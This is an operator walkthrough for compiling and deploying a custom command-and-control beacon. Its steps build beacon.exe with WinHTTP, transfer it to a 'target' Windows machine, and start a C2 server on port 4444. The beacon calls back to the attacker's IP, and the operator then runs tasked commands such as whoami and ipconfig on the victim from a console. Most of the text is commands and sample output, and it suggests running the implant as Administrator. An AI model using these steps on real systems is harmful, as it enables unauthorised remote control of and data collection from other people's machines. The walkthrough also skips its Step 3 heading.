Prerequisites on the Attacker’s Windows Machine (Development Machine)
Install MinGW (g++)

Download and install MSYS2.

Open MSYS2 UCRT64 terminal and install MinGW-w64:

bash
pacman -S mingw-w64-ucrt-x86_64-gcc
Add C:\msys64\ucrt64\bin to your system PATH.

Install Python 3.x

Download from python.org and install.

Ensure python is available in command prompt.

Obtain Source Files

Place beacon.cpp and c2_server.py in a dedicated folder, e.g., C:\c2_project.

Step 1 – Compile beacon.cpp into beacon.exe
Open Command Prompt or MSYS2 terminal and run:

cmd
cd C:\c2_project
g++ -o beacon.exe beacon.cpp -lwinhttp -static
-lwinhttp links the WinHTTP library (required for HTTP-based C2 communication).

-static embeds runtime libraries, making the executable portable.

Verify successful compilation:

cmd
dir beacon.exe
Step 2 – Transfer beacon.exe to the Target Windows Machine
Choose any method (examples):

HTTP server – on attacker machine:

cmd
python -m http.server 8000
On target machine, download via browser





Open a new Command Prompt (attacker machine) and start the server:

cmd
cd C:\c2_project
python c2_server.py start
You should see output similar to:

text
[+] C2 server listening on 0.0.0.0:4444
Step 4 – Execute the Beacon on the Target Machine
On the target Windows machine, run the beacon (preferably as Administrator for full command access):

cmd
beacon.exe
If the beacon expects a server address as an argument:

cmd
beacon.exe <attacker_IP> <port>
The beacon will attempt to connect to your C2 server. On the server side, you should see a new beacon registration message.

Step 5 – Interact with the Beacon via C2 Console
Once the beacon checks in, use the following commands in the server console:

Command	Description
beacons	List all connected beacons (shows machine ID, e.g., WIN-SRV01-XXXXXXXXXXXX)
use <machine_id>	Select a specific beacon for interaction (e.g., use WIN-SRV01-ABCD1234)
task whoami	Execute whoami on the target and retrieve output
task ipconfig	Run ipconfig
task dir C:	List the root directory of drive C:
tasks	Show all active tasks (pending/completed)
stop	Stop the currently running task (if any)
exit	Exit the C2 console (server continues running in background)
Example interaction:
text
c2> beacons
[+] ID: WIN-SRV01-A1B2C3D4 - 192.168.1.50 - Last seen: 10s ago

c2> use WIN-SRV01-A1B2C3D4
c2 (WIN-SRV01-A1B2C3D4)> task whoami
[+] Task sent: whoami
[+] Output: target\administrator

c2 (WIN-SRV01-A1B2C3D4)> task ipconfig
...
c2 (WIN-SRV01-A1B2C3D4)> tasks
[1] whoami – completed
[2] ipconfig – running
Step 6 – Stop and Clean Up
stop – cancels the currently executing task on the selected beacon.

exit – closes the interactive console (server remains alive).

Close the server terminal or press Ctrl+C to terminate the C2 server entirely.

